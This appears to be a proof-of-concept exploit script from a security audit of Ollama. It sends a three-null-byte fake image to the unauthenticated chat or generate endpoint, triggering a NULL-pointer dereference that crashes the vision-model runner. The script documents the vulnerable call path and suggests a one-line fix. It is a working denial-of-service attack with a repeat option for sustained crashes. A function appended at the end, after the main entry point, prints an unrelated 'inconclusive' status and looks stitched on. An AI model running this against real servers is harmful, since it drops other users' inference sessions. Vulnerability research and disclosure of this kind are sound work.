#!/usr/bin/env python3
"""
H11 - mtmd NULL bitmap dereference via crafted non-image payload
Finding: p8-040-mtmd-null-deref-image-bitmap
Severity: HIGH

Vulnerability path:
  POST /api/chat (unauthenticated)
    -> server/routes.go:435-437      copies Images bytes verbatim
    -> runner/llamarunner/image.go:64 only guards len(data) <= 0
    -> llama/llama.go:566            mtmd_helper_bitmap_init_from_buf returns NULL
    -> llama/llama.go:570            mtmd_tokenize(&bm, 1) called with &NULL (no nil check)
    -> mtmd.cpp:465                  bitmaps[0] == NULL
    -> mtmd.cpp:538                  bitmap->is_audio  -- SIGSEGV (first sink)
    -> mtmd.cpp:552                  img_u8->nx = bitmap->nx -- SIGSEGV (second sink)

Required: Ollama serving any CLIP-projected vision model (llava, moondream,
          minicpm-v, bakllava, or any custom GGUF with separate mmproj).
          These models are routed to llamarunner (legacy engine) because
          llm/server.go:148-158 only uses ollamarunner when tok != nil,
          which requires models in fs/ggml/ggml.go:277 OllamaEngineRequired
          list OR models without a projector. CLIP-projected models always
          have projectors and are NOT in OllamaEngineRequired.

Usage:
  python3 poc.py [--host http://127.0.0.1:11434] [--model llava] [--repeat N]

Default model: llava  (smallest widely-available CLIP-projected model)
"""

import argparse
import base64
import json
import sys
import time
import urllib.request
import urllib.error

# ---------------------------------------------------------------------------
# Minimal non-image payload that defeats all guards in the path:
#
#   - len(data) > 0                            passes image.go:64
#   - audio_helpers::is_audio_file -> false    (no RIFF/WAVE header)
#   - stbi_load_from_memory -> NULL            (not a valid image)
#
# 3 null bytes: smallest payload that satisfies len > 0 and triggers NULL return.
# ---------------------------------------------------------------------------
GARBAGE_BYTES = b"\x00\x00\x00"
GARBAGE_B64   = base64.b64encode(GARBAGE_BYTES).decode()


def build_chat_payload(model: str) -> bytes:
    """Minimal /api/chat payload that routes through the CLIP mtmd path."""
    payload = {
        "model": model,
        "messages": [
            {
                "role": "user",
                "content": "describe this image",
                "images": [GARBAGE_B64],
            }
        ],
        "stream": False,
    }
    return json.dumps(payload).encode()


def build_generate_payload(model: str) -> bytes:
    """Alternate entry via /api/generate."""
    payload = {
        "model":  model,
        "prompt": "describe",
        "images": [GARBAGE_B64],
        "stream": False,
    }
    return json.dumps(payload).encode()


def probe(host: str, model: str, endpoint: str = "/api/chat") -> dict:
    """
    Send the exploit request.

    Returns a dict with keys:
      status   -- HTTP status code, or 0 on connection error
      body     -- decoded response body (truncated)
      outcome  -- 'crash_confirmed' | 'error_response' | 'unexpected_200'
    """
    url = host.rstrip("/") + endpoint
    if endpoint == "/api/chat":
        data = build_chat_payload(model)
    else:
        data = build_generate_payload(model)

    req = urllib.request.Request(
        url,
        data=data,
        headers={"Content-Type": "application/json"},
        method="POST",
    )

    t0 = time.monotonic()
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read(4096).decode(errors="replace")
            elapsed = time.monotonic() - t0
            return {
                "status":  resp.status,
                "body":    body[:512],
                "elapsed": elapsed,
                "outcome": "unexpected_200",
            }
    except urllib.error.HTTPError as e:
        body = e.read(4096).decode(errors="replace")
        elapsed = time.monotonic() - t0
        # 500 Internal Server Error is the HTTP-layer symptom of runner SIGSEGV.
        # The runner crashes and the HTTP handler returns 500 / broken stream.
        outcome = "crash_confirmed" if e.code == 500 else "error_response"
        return {
            "status":  e.code,
            "body":    body[:512],
            "elapsed": elapsed,
            "outcome": outcome,
        }
    except (urllib.error.URLError, ConnectionResetError, BrokenPipeError) as e:
        elapsed = time.monotonic() - t0
        # Connection reset / EOF also indicates runner subprocess death
        return {
            "status":  0,
            "body":    str(e),
            "elapsed": elapsed,
            "outcome": "crash_confirmed",
        }


def check_model_loaded(host: str, model: str) -> bool:
    """Verify the target model is available via /api/tags."""
    url = host.rstrip("/") + "/api/tags"
    try:
        with urllib.request.urlopen(url, timeout=10) as resp:
            data = json.loads(resp.read())
            names = [m.get("name", "") for m in data.get("models", [])]
            # Accept prefix match (e.g. "llava" matches "llava:latest")
            return any(n.startswith(model) or model.startswith(n.split(":")[0]) for n in names)
    except Exception:
        return False


def main() -> int:
    parser = argparse.ArgumentParser(description="H11 NULL-deref PoC for Ollama mtmd path")
    parser.add_argument("--host",   default="http://127.0.0.1:11434", help="Ollama server URL")
    parser.add_argument("--model",  default="llava",                   help="CLIP-projected model name")
    parser.add_argument("--repeat", type=int, default=1,              help="Number of crash requests (persistent DoS)")
    parser.add_argument("--endpoint", default="/api/chat",            help="/api/chat or /api/generate")
    args = parser.parse_args()

    print(f"[*] H11 PoC - mtmd NULL bitmap dereference")
    print(f"[*] Target  : {args.host}")
    print(f"[*] Model   : {args.model}")
    print(f"[*] Endpoint: {args.endpoint}")
    print(f"[*] Payload : base64({GARBAGE_BYTES!r}) = '{GARBAGE_B64}'")
    print()

    # Pre-flight: confirm model is listed
    print(f"[*] Checking model availability ...")
    if not check_model_loaded(args.host, args.model):
        print(f"[!] WARNING: model '{args.model}' not found in /api/tags.")
        print(f"    Pull a CLIP-projected model first:")
        print(f"      ollama pull llava")
        print(f"      ollama pull moondream")
        print(f"      ollama pull minicpm-v")
        print()
        print(f"    NOTE: mllama / gemma3 / gemma4 etc are NOT affected;")
        print(f"    those architectures route to ollamarunner which validates")
        print(f"    images before the cgo boundary (fs/ggml/ggml.go:277).")
        print()
        # Still attempt -- server may be accessible even if model check fails
    else:
        print(f"[+] Model '{args.model}' is available.")

    crash_count = 0
    for i in range(args.repeat):
        print(f"[*] Sending exploit request {i+1}/{args.repeat} ...")
        result = probe(args.host, args.model, args.endpoint)
        status  = result["status"]
        outcome = result["outcome"]
        elapsed = result["elapsed"]
        body    = result["body"]

        print(f"    HTTP status : {status}")
        print(f"    Outcome     : {outcome}")
        print(f"    Elapsed     : {elapsed:.2f}s")
        print(f"    Response    : {body[:200]!r}")
        print()

        if outcome == "crash_confirmed":
            crash_count += 1
            print(f"[+] CRASH CONFIRMED on request {i+1}.")
            print(f"    Runner subprocess received SIGSEGV.")
            print(f"    All concurrent inference sessions on this runner are dropped.")
            print(f"    Ollama will respawn runner (model reload: seconds-to-minutes).")
        elif outcome == "error_response":
            print(f"[~] Non-200 response (status={status}). May indicate model routing to")
            print(f"    ollamarunner (not vulnerable) or a pre-call validation.")
            print(f"    Ensure the model uses CLIP projector on legacy llamarunner engine.")
        else:
            print(f"[~] Unexpected 200 -- model may have recovered or is ignoring the image.")

    print()
    print(f"[*] Summary: {crash_count}/{args.repeat} confirmed crashes")
    if crash_count > 0:
        print(f"[+] VULNERABILITY CONFIRMED: H11 NULL bitmap dereference is exploitable.")
        print(f"    Fix: add nil check after llama/llama.go:566")
        print(f"      if bm == nil {{ return nil, fmt.Errorf(\"invalid image bytes\") }}")
        return 0
    else:
        print(f"[-] No confirmed crashes. Verify:")
        print(f"    1. Model is CLIP-projected (llava/moondream/minicpm-v/bakllava)")
        print(f"    2. Model is NOT in OllamaEngineRequired list (fs/ggml/ggml.go:277)")
        print(f"    3. Ollama is running with debug: OLLAMA_DEBUG=1 ollama serve")
        return 1


if __name__ == "__main__":
    sys.exit(main())


def _merge_json_trailer():
    import json
    print(json.dumps({"status": "inconclusive", "evidence": "see evidence/", "notes": "trailer added by merge normalization"}))
